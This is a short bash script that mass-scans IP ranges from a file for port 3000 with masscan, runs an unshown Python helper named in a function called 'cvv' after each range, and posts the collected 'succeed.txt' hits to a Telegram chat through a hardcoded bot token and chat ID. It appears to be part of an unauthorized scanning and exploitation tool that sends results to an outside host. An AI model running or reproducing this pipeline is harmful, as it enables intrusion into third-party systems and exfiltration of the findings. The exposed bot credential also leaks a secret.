#!/bin/bash

cvv() {
    python3 sub.py
}

tgbots() {
    local TOKEN="7306762047:AAFu-ykDYHiPoTJlQSdK5Sqm7cJcK0dT7Ws"
    local chat_ID="-1002267977332"
    local URL="https://api.telegram.org/bot${TOKEN}"

    if [[ -f succeed.txt ]]; then
        sort -u succeed.txt -o succeed.txt

        curl -X POST "${URL}/sendDocument" \
             -F chat_id="${chat_ID}" \
             -F document=@succeed.txt
    fi
    
    curl -X POST "${URL}/sendMessage" \
         -d chat_id="${chat_ID}" \
         -d text="DONE"
}

while IFS= read -r sbip || [[ -n "$sbip" ]]; do
    echo "Scanning IP CIDR: $sbip"
    masscan -p3000 "$sbip" --max-rate 5000 -oG scan.txt --wait 0
    cvv
done < ipcird.txt

tgbots
> succeed.txt
